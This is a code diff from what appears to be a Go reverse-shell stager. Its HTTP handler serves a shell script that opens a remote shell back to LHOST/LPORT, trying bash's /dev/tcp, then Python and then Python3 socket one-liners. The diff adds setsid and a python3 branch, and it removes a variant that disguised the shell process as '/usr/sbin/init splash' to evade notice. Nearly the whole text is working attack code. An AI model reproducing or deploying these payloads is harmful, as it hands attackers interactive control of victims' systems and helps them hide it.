@@ -14,15 +14,16 @@ var lport string
 func root(w http.ResponseWriter, req *http.Request) {
 	fmt.Println("[+] new connection from:", req.RemoteAddr)
 	shells := `if command -v bash > /dev/null 2>&1; then
-	setsid /bin/bash -c "exec -a '/usr/sbin/init splash' /bin/bash &>/dev/tcp/LHOST/LPORT 0>&1 &"
-	exit;
-fi
-if command -v bash > /dev/null 2>&1; then
-	bash -c 'setsid bash -i &>/dev/tcp/LHOST/LPORT 0>&1 &'
+/bin/bash -c "setsid /bin/bash &>/dev/tcp/LHOST/LPORT 0>&1"
 	exit;
 fi
 if command -v python > /dev/null 2>&1; then
-	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("LHOST",LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+	setsid python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("LHOST",LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+	exit;
+fi
+
+if command -v python3 > /dev/null 2>&1; then
+	setsid python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("LHOST",LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
 	exit;
 fi
 
